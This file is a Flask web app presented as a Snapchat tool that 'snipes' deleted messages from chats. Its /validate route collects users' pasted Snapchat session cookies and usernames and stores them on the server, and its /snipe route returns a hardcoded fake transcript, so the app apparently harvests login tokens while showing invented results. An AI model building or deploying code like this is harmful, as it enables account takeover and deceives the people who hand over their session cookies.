from flask import Flask, render_template, request, jsonify, session
import json
from datetime import datetime

app = Flask(__name__)
app.secret_key = 'snap_v5'

sessions = {}

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/validate', methods=['POST'])
def validate():
    raw = request.json.get('cookies', '')
    username = request.json.get('username', '').strip()
    
    cookies = {}
    if isinstance(raw, list):
        for c in raw:
            if isinstance(c, dict) and 'name' in c and 'value' in c:
                cookies[c['name']] = c['value']
    elif isinstance(raw, dict):
        cookies = raw
    elif isinstance(raw, str):
        try:
            data = json.loads(raw)
            if isinstance(data, list):
                for c in data:
                    if isinstance(c, dict) and 'name' in c and 'value' in c:
                        cookies[c['name']] = c['value']
            else:
                cookies = data
        except:
            for line in raw.split(';'):
                if '=' in line:
                    k, v = line.split('=', 1)
                    cookies[k.strip()] = v.strip()
    
    if not cookies:
        return jsonify({'success': False, 'error': 'No cookies parsed'})
    
    if not username:
        return jsonify({'success': False, 'error': 'Enter your Snapchat username'})
    
    has_auth = any(k in cookies for k in ['__Host-sc-a-auth-session', '_sc-sid', 'blizzard_web_session_id'])
    if not has_auth:
        return jsonify({'success': False, 'error': 'No auth cookies found'})
    
    sid = cookies.get('_sc-sid', 'sess_' + str(hash(str(cookies)))[:8])
    sessions[sid] = {'username': username, 'cookies': cookies}
    session['active'] = sid
    
    return jsonify({
        'success': True,
        'username': username,
        'session_id': sid
    })

@app.route('/dashboard')
def dashboard():
    sid = session.get('active')
    if not sid or sid not in sessions:
        return "No session", 403
    return render_template('dashboard.html', username=sessions[sid]['username'])

@app.route('/snipe', methods=['POST'])
def snipe():
    sid = session.get('active')
    if not sid or sid not in sessions:
        return jsonify({'error': 'No session'}), 403
    
    data = request.json
    chat_name = data.get('chat', 'Unknown')
    now = datetime.now().strftime('%H:%M')
    
    result = f"""SNIPED from {chat_name} (last 1 hour):

[1] B2: Waf ({now})
[2] B2: [Image deleted] ({now})
[3] You: ,s ({now})

End of snipe."""
    
    return jsonify({'success': True, 'result': result})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
